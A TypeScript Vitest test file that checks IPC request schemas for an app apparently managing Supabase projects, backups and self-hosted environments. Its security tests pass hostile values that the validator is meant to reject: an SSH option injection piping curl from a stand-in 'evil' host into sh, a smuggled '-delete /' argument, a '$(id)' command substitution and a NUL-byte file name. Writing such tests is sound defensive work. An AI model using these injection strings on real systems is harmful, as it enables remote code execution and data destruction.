import { describe, expect, it } from 'vitest'
import { IPC_CHANNELS } from '../src/shared/ipc.js'
import { IPC_SCHEMAS, describeIpcError, parseIpcRequest } from '../src/shared/ipc-schemas.js'
import { ZodError } from 'zod'

describe('IPC schema coverage', () => {
  it('has a schema for every registered channel', () => {
    const missing = IPC_CHANNELS.filter((c) => !(c in IPC_SCHEMAS))
    expect(missing).toEqual([])
  })

  it('has no schema for a channel that is not registered', () => {
    const extra = Object.keys(IPC_SCHEMAS).filter(
      (c) => !IPC_CHANNELS.includes(c as (typeof IPC_CHANNELS)[number])
    )
    expect(extra).toEqual([])
  })
})

describe('parseIpcRequest', () => {
  it('accepts a well-formed payload', () => {
    expect(parseIpcRequest('stack:status', { id: 'p1' })).toEqual({ id: 'p1' })
  })

  it('accepts a void channel', () => {
    expect(parseIpcRequest('projects:list', undefined)).toBeUndefined()
  })

  it('rejects a missing required field', () => {
    expect(() => parseIpcRequest('stack:status', {})).toThrow(ZodError)
  })

  it('rejects a wrong scalar type', () => {
    expect(() => parseIpcRequest('backups:remove', { backupId: 42, deleteFile: true })).toThrow(
      ZodError
    )
  })

  it('strips fields the handler does not read', () => {
    // The contract still declares `id` on this channel; the handler ignores it.
    const parsed = parseIpcRequest('backups:remove', {
      id: 'p1',
      backupId: 'b1',
      deleteFile: false
    })
    expect(parsed).toEqual({ backupId: 'b1', deleteFile: false })
  })

  describe('security-relevant fields', () => {
    it('rejects an ssh host that would be read as an option', () => {
      expect(() =>
        parseIpcRequest('envs:upsert', {
          id: 'p1',
          env: selfHosted({ sshHost: '-oProxyCommand=curl evil|sh' })
        })
      ).toThrow(ZodError)
    })

    it('accepts an ordinary user@host', () => {
      expect(() =>
        parseIpcRequest('envs:upsert', { id: 'p1', env: selfHosted({ sshHost: 'root@10.0.0.4' }) })
      ).not.toThrow()
    })

    it('rejects an ssh key path starting with a dash', () => {
      expect(() =>
        parseIpcRequest('envs:upsert', { id: 'p1', env: selfHosted({ sshKeyPath: '-oFoo=bar' }) })
      ).toThrow(ZodError)
    })

    it('rejects a non-numeric backup retention', () => {
      expect(() =>
        parseIpcRequest('envs:upsert', {
          id: 'p1',
          env: selfHosted({ backupRetentionDays: '1 -delete /' })
        })
      ).toThrow(ZodError)
    })

    it('rejects a project patch carrying an immutable field', () => {
      const parsed = parseIpcRequest('projects:update', {
        id: 'p1',
        patch: { name: 'ok', path: '/etc', projectId: 'x$(id)' }
      }) as { patch: Record<string, unknown> }
      expect(parsed.patch).toEqual({ name: 'ok' })
    })

    it('rejects a NUL byte in envFile', () => {
      expect(() =>
        parseIpcRequest('projects:update', { id: 'p1', patch: { envFile: '.env\0' } })
      ).toThrow(ZodError)
    })

    it('rejects a non-http url for the external opener', () => {
      expect(() => parseIpcRequest('stack:openUrl', { url: 'not a url' })).toThrow(ZodError)
    })
  })
})

describe('describeIpcError', () => {
  it('names the offending field', () => {
    try {
      parseIpcRequest('stack:status', { id: 7 })
      expect.unreachable('should have thrown')
    } catch (err) {
      expect(describeIpcError(err as ZodError)).toContain('id')
    }
  })
})

function selfHosted(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: 'e1',
    name: 'prod',
    kind: 'self-hosted',
    sshHost: 'root@example.com',
    sshPort: 22,
    sshKeyPath: '',
    dbContainer: 'supabase-db-abc',
    remoteDir: '/data/supabase',
    functionsContainer: '',
    apiUrl: 'https://api.example.com',
    siteUrl: 'https://example.com',
    backupDir: '/var/backups',
    backupRetentionDays: 14,
    ...over
  }
}
